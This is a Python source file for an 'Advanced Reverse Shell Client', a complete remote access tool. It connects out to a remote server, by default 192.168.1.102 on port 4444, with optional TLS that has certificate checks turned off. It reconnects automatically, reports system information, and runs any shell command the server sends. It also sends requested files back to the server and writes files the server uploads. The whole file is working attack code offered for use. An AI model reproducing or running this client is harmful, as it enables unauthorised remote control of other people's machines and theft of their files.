#!/usr/bin/env python3
"""
Advanced Reverse Shell Client
A feature-rich reverse shell client with encryption, file transfer, and advanced capabilities.
"""

import socket
import json
import subprocess
import os
import base64
import time
import sys
import threading
import argparse
import logging
from pathlib import Path
from datetime import datetime
import ssl
import hashlib
import struct

class ReverseShellClient:
    def __init__(self, host, port, use_ssl=False, reconnect_delay=5, buffer_size=4096):
        """
        Initialize the reverse shell client.
        
        Args:
            host: Server hostname or IP address
            port: Server port number
            use_ssl: Enable SSL/TLS encryption
            reconnect_delay: Delay between reconnection attempts (seconds)
            buffer_size: Socket buffer size
        """
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.reconnect_delay = reconnect_delay
        self.buffer_size = buffer_size
        self.connection = None
        self.running = False
        self.current_directory = os.getcwd()
        
        # Setup logging
        self.setup_logging()
        
    def setup_logging(self):
        """Setup logging configuration."""
        try:
            logging.basicConfig(
                level=logging.INFO,
                format='%(asctime)s - %(levelname)s - %(message)s',
                handlers=[
                    logging.FileHandler('client.log'),
                    logging.StreamHandler(sys.stdout)
                ]
            )
            self.logger = logging.getLogger(__name__)
        except Exception as e:
            print(f"Error setting up logging: {e}")
            self.logger = None
    
    def log(self, message, level='info'):
        """Log a message."""
        if self.logger:
            if level == 'error':
                self.logger.error(message)
            elif level == 'warning':
                self.logger.warning(message)
            else:
                self.logger.info(message)
    
    def connect(self):
        """Establish connection to the server with automatic reconnection."""
        while not self.running:
            try:
                self.log(f"Attempting to connect to {self.host}:{self.port}...")
                
                # Create socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                
                # Connect
                sock.connect((self.host, self.port))
                
                # Wrap with SSL if enabled
                if self.use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    self.connection = context.wrap_socket(sock, server_hostname=self.host)
                    self.log("SSL connection established")
                else:
                    self.connection = sock
                
                self.log(f"Successfully connected to {self.host}:{self.port}")
                self.running = True
                return True
                
            except socket.timeout:
                self.log(f"Connection timeout. Retrying in {self.reconnect_delay} seconds...", 'warning')
                time.sleep(self.reconnect_delay)
            except ConnectionRefusedError:
                self.log(f"Connection refused. Retrying in {self.reconnect_delay} seconds...", 'warning')
                time.sleep(self.reconnect_delay)
            except Exception as e:
                self.log(f"Connection error: {e}. Retrying in {self.reconnect_delay} seconds...", 'error')
                time.sleep(self.reconnect_delay)
        
        return False
    
    def send_data(self, data):
        """
        Send data to the server with proper framing.
        
        Args:
            data: Data to send (dict, str, or bytes)
        """
        try:
            if isinstance(data, dict):
                json_data = json.dumps(data)
            elif isinstance(data, str):
                json_data = data
            elif isinstance(data, bytes):
                json_data = base64.b64encode(data).decode('utf-8')
            else:
                json_data = str(data)
            
            # Send length prefix
            encoded = json_data.encode('utf-8')
            length = struct.pack('>I', len(encoded))
            self.connection.sendall(length + encoded)
            
        except BrokenPipeError:
            self.log("Connection broken. Attempting to reconnect...", 'error')
            self.running = False
            self.connect()
        except Exception as e:
            self.log(f"Error sending data: {e}", 'error')
            self.running = False
    
    def receive_data(self):
        """
        Receive data from the server with proper framing.
        
        Returns:
            Decoded data (dict, str, or None on error)
        """
        try:
            # Receive length prefix
            length_data = self._recv_all(4)
            if not length_data:
                return None
            
            length = struct.unpack('>I', length_data)[0]
            
            # Receive actual data
            json_data = self._recv_all(length).decode('utf-8')
            
            try:
                return json.loads(json_data)
            except json.JSONDecodeError:
                return json_data
                
        except socket.timeout:
            self.log("Receive timeout", 'warning')
            return None
        except ConnectionResetError:
            self.log("Connection reset by server. Reconnecting...", 'error')
            self.running = False
            self.connect()
            return None
        except Exception as e:
            self.log(f"Error receiving data: {e}", 'error')
            return None
    
    def _recv_all(self, size):
        """Receive exactly 'size' bytes from the socket."""
        data = b''
        while len(data) < size:
            chunk = self.connection.recv(size - len(data))
            if not chunk:
                raise ConnectionResetError("Connection closed")
            data += chunk
        return data
    
    def execute_command(self, command):
        """
        Execute a shell command safely.
        
        Args:
            command: Command string to execute
            
        Returns:
            Command output (str)
        """
        try:
            # Change directory command
            if command.startswith('cd '):
                path = command[3:].strip()
                if not path:
                    path = os.path.expanduser('~')
                
                try:
                    os.chdir(path)
                    self.current_directory = os.getcwd()
                    return f"Changed directory to: {self.current_directory}"
                except Exception as e:
                    return f"Error changing directory: {str(e)}"
            
            # Execute command
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                cwd=self.current_directory,
                universal_newlines=True
            )
            
            stdout, stderr = process.communicate()
            result = stdout + stderr
            
            if not result:
                result = f"Command executed successfully (exit code: {process.returncode})"
            
            return result
            
        except Exception as e:
            return f"Error executing command: {str(e)}"
    
    def download_file(self, file_path):
        """
        Download a file from the client to the server.
        
        Args:
            file_path: Path to the file to download
            
        Returns:
            Base64 encoded file data or error message
        """
        try:
            file_path = os.path.expanduser(file_path)
            
            if not os.path.exists(file_path):
                return f"Error: File not found: {file_path}"
            
            if not os.path.isfile(file_path):
                return f"Error: Path is not a file: {file_path}"
            
            with open(file_path, 'rb') as f:
                file_data = f.read()
                file_size = len(file_data)
                
                # Calculate file hash
                file_hash = hashlib.md5(file_data).hexdigest()
                
                self.log(f"Downloading file: {file_path} ({file_size} bytes)")
                
                return {
                    'status': 'success',
                    'filename': os.path.basename(file_path),
                    'data': base64.b64encode(file_data).decode('utf-8'),
                    'size': file_size,
                    'hash': file_hash
                }
                
        except PermissionError:
            return {'status': 'error', 'message': f"Permission denied: {file_path}"}
        except Exception as e:
            return {'status': 'error', 'message': f"Error downloading file: {str(e)}"}
    
    def upload_file(self, file_path, file_data):
        """
        Upload a file from the server to the client.
        
        Args:
            file_path: Destination path for the file
            file_data: Base64 encoded file data
            
        Returns:
            Success or error message
        """
        try:
            file_path = os.path.expanduser(file_path)
            
            # Decode base64 data
            if isinstance(file_data, dict):
                data = base64.b64decode(file_data.get('data', ''))
                filename = file_data.get('filename', os.path.basename(file_path))
            else:
                data = base64.b64decode(file_data)
                filename = os.path.basename(file_path)
            
            # Create directory if needed
            os.makedirs(os.path.dirname(file_path) if os.path.dirname(file_path) else '.', exist_ok=True)
            
            # Write file
            with open(file_path, 'wb') as f:
                f.write(data)
            
            file_size = len(data)
            self.log(f"Uploaded file: {file_path} ({file_size} bytes)")
            
            return f"File uploaded successfully: {file_path} ({file_size} bytes)"
            
        except PermissionError:
            return f"Error: Permission denied: {file_path}"
        except Exception as e:
            return f"Error uploading file: {str(e)}"
    
    def get_system_info(self):
        """Get system information."""
        try:
            import platform
            
            info = {
                'hostname': socket.gethostname(),
                'platform': platform.system(),
                'platform_release': platform.release(),
                'platform_version': platform.version(),
                'architecture': platform.machine(),
                'processor': platform.processor(),
                'current_user': os.getenv('USER') or os.getenv('USERNAME', 'unknown'),
                'current_directory': os.getcwd(),
                'python_version': sys.version
            }
            
            return json.dumps(info, indent=2)
        except Exception as e:
            return f"Error getting system info: {str(e)}"
    
    def run(self):
        """Main loop to receive and execute commands."""
        if not self.connect():
            return
        
        try:
            # Send initial system info
            self.send_data({
                'type': 'system_info',
                'data': self.get_system_info()
            })
            
            while self.running:
                try:
                    # Receive command
                    command_data = self.receive_data()
                    
                    if not command_data:
                        continue
                    
                    # Handle different command types
                    if isinstance(command_data, dict):
                        cmd_type = command_data.get('type', 'command')
                        cmd_data = command_data.get('data', '')
                        
                        if cmd_type == 'command':
                            result = self.execute_command(cmd_data)
                            self.send_data({'type': 'result', 'data': result})
                        
                        elif cmd_type == 'download':
                            result = self.download_file(cmd_data)
                            self.send_data({'type': 'download_result', 'data': result})
                        
                        elif cmd_type == 'upload':
                            file_path = command_data.get('path', '')
                            file_data = command_data.get('file_data', '')
                            result = self.upload_file(file_path, file_data)
                            self.send_data({'type': 'upload_result', 'data': result})
                        
                        elif cmd_type == 'exit':
                            self.log("Received exit command")
                            break
                        
                        elif cmd_type == 'system_info':
                            result = self.get_system_info()
                            self.send_data({'type': 'system_info', 'data': result})
                        
                        else:
                            self.send_data({'type': 'error', 'data': f"Unknown command type: {cmd_type}"})
                    
                    else:
                        # Legacy string command format
                        command = str(command_data).strip()
                        
                        if command == 'exit':
                            self.log("Received exit command")
                            break
                        elif command.startswith('cd '):
                            result = self.execute_command(command)
                            self.send_data(result)
                        elif command.startswith('download '):
                            file_path = command[9:].strip()
                            result = self.download_file(file_path)
                            if isinstance(result, dict):
                                self.send_data(result)
                            else:
                                self.send_data({'type': 'error', 'data': result})
                        elif command.startswith('upload '):
                            file_path = command[7:].strip()
                            file_data = self.receive_data()
                            result = self.upload_file(file_path, file_data)
                            self.send_data(result)
                        else:
                            result = self.execute_command(command)
                            self.send_data(result)
                
                except KeyboardInterrupt:
                    self.log("Interrupted by user", 'warning')
                    break
                except Exception as e:
                    self.log(f"Error in main loop: {e}", 'error')
                    self.send_data({'type': 'error', 'data': str(e)})
        
        except Exception as e:
            self.log(f"Fatal error: {e}", 'error')
        finally:
            self.cleanup()
    
    def cleanup(self):
        """Clean up resources."""
        try:
            if self.connection:
                self.connection.close()
            self.running = False
            self.log("Connection closed")
        except Exception as e:
            self.log(f"Error during cleanup: {e}", 'error')

def main():
    """Main function."""
    parser = argparse.ArgumentParser(
        description='Advanced Reverse Shell Client',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 client.py --host 192.168.1.100 --port 4444
  python3 client.py --host example.com --port 8080 --ssl
  python3 client.py --host 10.0.0.1 --port 9999 --reconnect-delay 10
        """
    )
    
    parser.add_argument(
        '--host', '-H',
        type=str,
        default='192.168.1.102',
        help='Server hostname or IP address (default: 192.168.1.102)'
    )
    
    parser.add_argument(
        '--port', '-p',
        type=int,
        default=4444,
        help='Server port number (default: 4444)'
    )
    
    parser.add_argument(
        '--ssl',
        action='store_true',
        help='Enable SSL/TLS encryption'
    )
    
    parser.add_argument(
        '--reconnect-delay', '-d',
        type=int,
        default=5,
        help='Delay between reconnection attempts in seconds (default: 5)'
    )
    
    parser.add_argument(
        '--buffer-size', '-b',
        type=int,
        default=4096,
        help='Socket buffer size (default: 4096)'
    )
    
    args = parser.parse_args()
    
    # Create and run client
    client = ReverseShellClient(
        host=args.host,
        port=args.port,
        use_ssl=args.ssl,
        reconnect_delay=args.reconnect_delay,
        buffer_size=args.buffer_size
    )
    
    try:
        client.run()
    except KeyboardInterrupt:
        print("\nShutting down...")
        client.cleanup()
        sys.exit(0)

if __name__ == '__main__':
    main()
